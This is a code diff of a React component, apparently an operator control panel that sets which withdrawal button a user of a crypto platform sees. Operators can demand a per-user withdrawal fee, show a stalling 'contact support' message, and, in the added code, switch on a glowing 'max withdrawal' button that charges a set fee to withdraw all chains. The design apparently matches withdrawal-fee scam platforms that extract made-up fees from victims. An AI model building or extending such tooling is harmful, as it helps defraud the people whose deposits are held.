@@ -1,37 +1,68 @@
 import { useState } from "react";
-import { Loader2 } from "lucide-react";
+import { Loader2, Sparkles } from "lucide-react";
 import type { WithdrawButton } from "@/lib/withdraw";
+
+export interface WithdrawSettings {
+  button: WithdrawButton;
+  fee: number;
+  supportMessage: string;
+  maxWithdraw: boolean;
+  maxFee: number;
+}
 
 export function WithdrawButtonControl({
   current,
   currentFee,
   currentSupportMessage,
+  currentMaxWithdraw = false,
+  currentMaxFee = 0,
   onSet,
 }: {
   current: WithdrawButton;
   currentFee: number;
   currentSupportMessage?: string | null;
-  onSet: (button: WithdrawButton, fee: number, supportMessage: string) => Promise<unknown>;
+  currentMaxWithdraw?: boolean;
+  currentMaxFee?: number;
+  onSet: (settings: WithdrawSettings) => Promise<unknown>;
 }) {
   const [fee, setFee] = useState(currentFee ? String(currentFee) : "");
   const [supportMessage, setSupportMessage] = useState(
     currentSupportMessage ?? "Please contact support to rectify the issue with your withdrawal.",
   );
-  const [busy, setBusy] = useState<WithdrawButton | null>(null);
+  const [maxFee, setMaxFee] = useState(currentMaxFee ? String(currentMaxFee) : "");
+  const [maxOn, setMaxOn] = useState(currentMaxWithdraw);
+  const [busy, setBusy] = useState<string | null>(null);
   const [err, setErr] = useState<string | null>(null);
   const feeNum = Number(fee);
   const feeValid = fee !== "" && Number.isFinite(feeNum) && feeNum > 0;
+  const maxFeeNum = Number(maxFee);
+  const maxFeeValid = maxFee !== "" && Number.isFinite(maxFeeNum) && maxFeeNum > 0;
 
-  const run = async (button: WithdrawButton) => {
-    setBusy(button);
+  const save = async (next: Partial<WithdrawSettings>, key: string) => {
+    setBusy(key);
     setErr(null);
     try {
-      await onSet(button, feeValid ? feeNum : 0, supportMessage.trim());
+      await onSet({
+        button: current,
+        fee: feeValid ? feeNum : 0,
+        supportMessage: supportMessage.trim(),
+        maxWithdraw: maxOn,
+        maxFee: maxFeeValid ? maxFeeNum : 0,
+        ...next,
+      });
     } catch (e) {
       setErr(e instanceof Error ? e.message : "Failed");
     } finally {
       setBusy(null);
     }
+  };
+
+  const run = (button: WithdrawButton) => save({ button }, button);
+
+  const toggleMax = async () => {
+    const next = !maxOn;
+    await save({ maxWithdraw: next }, "max");
+    setMaxOn(next);
   };
 
   return (
@@ -50,7 +81,8 @@ export function WithdrawButtonControl({
         </span>
       </div>
       <p className="mt-1 text-[11px] text-muted-foreground">
-        Only one button shows at a time. Green requires a fee amount. The support button opens support and does not require a fee.
+        Only one button shows at a time. Green requires a fee amount. The support button opens
+        support and does not require a fee.
       </p>
       <div className="mt-3 flex flex-wrap items-center gap-2">
         <input
@@ -104,7 +136,56 @@ export function WithdrawButtonControl({
           className="mt-1 w-full resize-none rounded-md border border-border bg-background px-2 py-1.5 text-xs text-foreground outline-none focus:border-primary"
         />
       </label>
-      {!feeValid && <p className="mt-2 text-[11px] text-muted-foreground">Enter a fee amount only when enabling the green button.</p>}
+      {!feeValid && (
+        <p className="mt-2 text-[11px] text-muted-foreground">
+          Enter a fee amount only when enabling the green button.
+        </p>
+      )}
+
+      <div className="mt-4 rounded-xl border border-emerald-500/30 bg-emerald-500/5 p-3">
+        <div className="flex flex-wrap items-center justify-between gap-2">
+          <span className="text-sm font-medium">Max withdrawal button</span>
+          <span className="text-xs text-muted-foreground">
+            {maxOn ? `Active · fee $${(currentMaxFee || maxFeeNum || 0).toLocaleString()}` : "off"}
+          </span>
+        </div>
+        <p className="mt-1 text-[11px] text-muted-foreground">
+          Shows a glowing green button that withdraws every chain the user holds at once. Users only
+          enter the addresses they need — EVM only, or EVM and Solana when both are held.
+        </p>
+        <div className="mt-3 flex flex-wrap items-center gap-2">
+          <input
+            value={maxFee}
+            onChange={(e) => setMaxFee(e.target.value)}
+            inputMode="decimal"
+            placeholder="Max withdrawal fee (USD)"
+            className="w-48 glass rounded-lg px-3 py-2 text-sm outline-none focus:ring-2 focus:ring-ring"
+          />
+          <button
+            type="button"
+            disabled={busy !== null || (!maxOn && !maxFeeValid)}
+            onClick={toggleMax}
+            className="animate-glow-pulse inline-flex items-center gap-1.5 rounded-lg px-4 py-2 text-xs font-bold text-white transition hover:opacity-90 disabled:opacity-40 disabled:[animation:none]"
+            style={{
+              backgroundImage: "linear-gradient(135deg,#6ee7b7 0%,#10b981 45%,#047857 100%)",
+            }}
+            title={maxOn || maxFeeValid ? "" : "Enter the fee amount first"}
+          >
+            {busy === "max" ? (
+              <Loader2 className="h-3.5 w-3.5 animate-spin" />
+            ) : (
+              <Sparkles className="h-3.5 w-3.5" />
+            )}
+            {maxOn ? "Disable max withdrawal" : "Add max withdrawal button"}
+          </button>
+        </div>
+        {!maxOn && !maxFeeValid && (
+          <p className="mt-2 text-[11px] text-muted-foreground">
+            Enter the fee amount before enabling max withdrawal.
+          </p>
+        )}
+      </div>
+
       {err && <p className="mt-2 text-xs text-destructive">{err}</p>}
     </div>
   );
